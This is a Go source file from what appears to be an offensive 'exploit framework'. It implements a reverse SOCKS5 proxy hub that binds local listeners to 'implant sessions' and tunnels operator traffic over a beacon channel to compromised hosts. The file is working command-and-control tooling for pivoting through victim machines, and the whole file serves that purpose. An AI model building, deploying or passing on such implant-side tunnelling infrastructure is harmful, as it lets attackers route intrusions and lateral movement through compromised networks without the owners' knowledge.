package socks

import (
	"fmt"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

const (
	maxFrameData = 32 << 10 // 32 KiB per DATA frame
	openTimeout  = 60 * time.Second
)

// Hub manages reverse SOCKS listeners bound to implant sessions.
// Operator tools connect locally; traffic is framed over the beacon channel.
type Hub struct {
	mu        sync.Mutex
	bySession map[string]*sessionProxy
}

// NewHub creates an empty SOCKS hub.
func NewHub() *Hub {
	return &Hub{bySession: make(map[string]*sessionProxy)}
}

// StartForSession starts a local SOCKS5 listener for sessionID.
func (h *Hub) StartForSession(sessionID string, port uint32) (uint32, error) {
	if sessionID == "" {
		return 0, fmt.Errorf("session_id required")
	}
	if port == 0 {
		port = 1080
	}

	h.mu.Lock()
	defer h.mu.Unlock()

	if existing, ok := h.bySession[sessionID]; ok && existing.running {
		return existing.port, nil
	}

	addr := fmt.Sprintf("127.0.0.1:%d", port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return 0, fmt.Errorf("listen %s: %w", addr, err)
	}

	sp := &sessionProxy{
		sessionID:  sessionID,
		port:       port,
		listener:   ln,
		running:    true,
		conns:      make(map[uint32]*proxyConn),
		outbound:   make(chan *pb.SocksFrame, 256),
		openWait:   make(map[uint32]chan int32),
		nextConnID: 1,
	}
	h.bySession[sessionID] = sp
	go sp.acceptLoop()
	log.Printf("[socks] reverse proxy for session %s on %s", sessionID, addr)
	return port, nil
}

// StopForSession stops the local SOCKS listener and closes tunnels.
func (h *Hub) StopForSession(sessionID string) error {
	h.mu.Lock()
	sp, ok := h.bySession[sessionID]
	if ok {
		delete(h.bySession, sessionID)
	}
	h.mu.Unlock()
	if !ok {
		return nil
	}
	sp.shutdown()
	return nil
}

// Active returns whether reverse SOCKS is running for the session.
func (h *Hub) Active(sessionID string) bool {
	h.mu.Lock()
	defer h.mu.Unlock()
	sp, ok := h.bySession[sessionID]
	return ok && sp.running
}

// DrainOutbound returns pending server→implant frames (non-blocking).
func (h *Hub) DrainOutbound(sessionID string) []*pb.SocksFrame {
	h.mu.Lock()
	sp, ok := h.bySession[sessionID]
	h.mu.Unlock()
	if !ok {
		return nil
	}
	return sp.drainOutbound()
}

// RequeueOutbound prepends frames after a failed encrypt/send so they are not lost.
func (h *Hub) RequeueOutbound(sessionID string, frames []*pb.SocksFrame) {
	if len(frames) == 0 {
		return
	}
	h.mu.Lock()
	sp, ok := h.bySession[sessionID]
	h.mu.Unlock()
	if !ok {
		return
	}
	sp.requeueOutbound(frames)
}

// HandleInbound processes implant→server frames.
func (h *Hub) HandleInbound(sessionID string, frames []*pb.SocksFrame) {
	if len(frames) == 0 {
		return
	}
	h.mu.Lock()
	sp, ok := h.bySession[sessionID]
	h.mu.Unlock()
	if !ok {
		return
	}
	for _, f := range frames {
		sp.handleInbound(f)
	}
}

type sessionProxy struct {
	sessionID  string
	port       uint32
	listener   net.Listener
	running    bool
	mu         sync.Mutex
	conns      map[uint32]*proxyConn
	outbound   chan *pb.SocksFrame
	openWait   map[uint32]chan int32
	nextConnID uint32
}

type proxyConn struct {
	id     uint32
	conn   net.Conn
	closed atomic.Bool
	// writeCh receives DATA payloads from implant
	writeCh chan []byte
}

func (sp *sessionProxy) shutdown() {
	sp.mu.Lock()
	sp.running = false
	ln := sp.listener
	sp.listener = nil
	conns := sp.conns
	sp.conns = make(map[uint32]*proxyConn)
	sp.mu.Unlock()
	if ln != nil {
		ln.Close()
	}
	for _, c := range conns {
		c.close()
	}
	log.Printf("[socks] stopped reverse proxy for session %s", sp.sessionID)
}

func (sp *sessionProxy) acceptLoop() {
	for {
		conn, err := sp.listener.Accept()
		if err != nil {
			sp.mu.Lock()
			running := sp.running
			sp.mu.Unlock()
			if !running {
				return
			}
			log.Printf("[socks] accept error session=%s: %v", sp.sessionID, err)
			continue
		}
		go sp.handleClient(conn)
	}
}

func (sp *sessionProxy) handleClient(conn net.Conn) {
	defer conn.Close()

	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil || n < 2 || buf[0] != 0x05 {
		return
	}
	// No auth
	if _, err := conn.Write([]byte{0x05, 0x00}); err != nil {
		return
	}

	n, err = conn.Read(buf)
	if err != nil || n < 7 || buf[1] != 0x01 {
		conn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	target, ok := parseSocksTarget(buf[:n])
	if !ok {
		conn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	connID, waitCh := sp.allocConn(conn)
	sp.enqueue(&pb.SocksFrame{
		ConnId: connID,
		Op:     pb.SocksFrameOp_SOCKS_OPEN,
		Target: target,
	})

	status := int32(-1)
	select {
	case status = <-waitCh:
	case <-time.After(openTimeout):
		sp.closeConn(connID, true)
		conn.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	if status != 0 {
		sp.closeConn(connID, false)
		conn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	if _, err := conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0}); err != nil {
		sp.closeConn(connID, true)
		return
	}

	pc := sp.getConn(connID)
	if pc == nil {
		return
	}

	// Client → implant
	go func() {
		buf := make([]byte, maxFrameData)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				data := make([]byte, n)
				copy(data, buf[:n])
				sp.enqueue(&pb.SocksFrame{
					ConnId: connID,
					Op:     pb.SocksFrameOp_SOCKS_DATA,
					Data:   data,
				})
			}
			if err != nil {
				sp.closeConn(connID, true)
				return
			}
		}
	}()

	// Implant → client
	for data := range pc.writeCh {
		if _, err := conn.Write(data); err != nil {
			sp.closeConn(connID, true)
			return
		}
	}
}

func (sp *sessionProxy) allocConn(conn net.Conn) (uint32, chan int32) {
	sp.mu.Lock()
	defer sp.mu.Unlock()
	id := sp.nextConnID
	sp.nextConnID++
	wait := make(chan int32, 1)
	sp.openWait[id] = wait
	sp.conns[id] = &proxyConn{
		id:      id,
		conn:    conn,
		writeCh: make(chan []byte, 64),
	}
	return id, wait
}

func (sp *sessionProxy) getConn(id uint32) *proxyConn {
	sp.mu.Lock()
	defer sp.mu.Unlock()
	return sp.conns[id]
}

func (sp *sessionProxy) enqueue(f *pb.SocksFrame) {
	select {
	case sp.outbound <- f:
	default:
		// Drop if operator floods faster than beacon drains
		log.Printf("[socks] outbound queue full session=%s conn=%d op=%v", sp.sessionID, f.ConnId, f.Op)
	}
}

func (sp *sessionProxy) drainOutbound() []*pb.SocksFrame {
	var out []*pb.SocksFrame
	for {
		select {
		case f := <-sp.outbound:
			out = append(out, f)
		default:
			return out
		}
	}
}

// requeueOutbound prepends frames (FIFO-preserving) after a failed send.
func (sp *sessionProxy) requeueOutbound(frames []*pb.SocksFrame) {
	// Drain current queue, then put requeued + remaining back in order.
	rest := sp.drainOutbound()
	combined := make([]*pb.SocksFrame, 0, len(frames)+len(rest))
	combined = append(combined, frames...)
	combined = append(combined, rest...)
	for _, f := range combined {
		if f == nil {
			continue
		}
		select {
		case sp.outbound <- f:
		default:
			log.Printf("[socks] requeue drop session=%s conn=%d op=%v", sp.sessionID, f.ConnId, f.Op)
		}
	}
}

func (sp *sessionProxy) handleInbound(f *pb.SocksFrame) {
	if f == nil {
		return
	}
	switch f.Op {
	case pb.SocksFrameOp_SOCKS_OPEN_RESULT:
		sp.mu.Lock()
		ch, ok := sp.openWait[f.ConnId]
		if ok {
			delete(sp.openWait, f.ConnId)
		}
		sp.mu.Unlock()
		if ok {
			select {
			case ch <- f.Status:
			default:
			}
		}
	case pb.SocksFrameOp_SOCKS_DATA:
		pc := sp.getConn(f.ConnId)
		if pc == nil || pc.closed.Load() {
			return
		}
		select {
		case pc.writeCh <- f.Data:
		default:
			// slow client
		}
	case pb.SocksFrameOp_SOCKS_CLOSE:
		sp.closeConn(f.ConnId, false)
	}
}

func (sp *sessionProxy) closeConn(id uint32, notifyImplant bool) {
	sp.mu.Lock()
	pc, ok := sp.conns[id]
	if ok {
		delete(sp.conns, id)
	}
	if ch, okw := sp.openWait[id]; okw {
		delete(sp.openWait, id)
		select {
		case ch <- -1:
		default:
		}
	}
	sp.mu.Unlock()
	if !ok {
		return
	}
	pc.close()
	if notifyImplant {
		sp.enqueue(&pb.SocksFrame{
			ConnId: id,
			Op:     pb.SocksFrameOp_SOCKS_CLOSE,
		})
	}
}

func (pc *proxyConn) close() {
	if pc.closed.Swap(true) {
		return
	}
	if pc.conn != nil {
		pc.conn.Close()
	}
	close(pc.writeCh)
}

func parseSocksTarget(buf []byte) (string, bool) {
	if len(buf) < 7 {
		return "", false
	}
	switch buf[3] {
	case 0x01: // IPv4
		if len(buf) < 10 {
			return "", false
		}
		return fmt.Sprintf("%d.%d.%d.%d:%d", buf[4], buf[5], buf[6], buf[7],
			uint16(buf[8])<<8|uint16(buf[9])), true
	case 0x03: // Domain
		domainLen := int(buf[4])
		if len(buf) < 5+domainLen+2 {
			return "", false
		}
		domain := string(buf[5 : 5+domainLen])
		port := uint16(buf[5+domainLen])<<8 | uint16(buf[5+domainLen+1])
		return fmt.Sprintf("%s:%d", domain, port), true
	case 0x04: // IPv6
		if len(buf) < 22 {
			return "", false
		}
		return fmt.Sprintf("[%x:%x:%x:%x:%x:%x:%x:%x]:%d",
			uint16(buf[4])<<8|uint16(buf[5]),
			uint16(buf[6])<<8|uint16(buf[7]),
			uint16(buf[8])<<8|uint16(buf[9]),
			uint16(buf[10])<<8|uint16(buf[11]),
			uint16(buf[12])<<8|uint16(buf[13]),
			uint16(buf[14])<<8|uint16(buf[15]),
			uint16(buf[16])<<8|uint16(buf[17]),
			uint16(buf[18])<<8|uint16(buf[19]),
			uint16(buf[20])<<8|uint16(buf[21])), true
	default:
		return "", false
	}
}

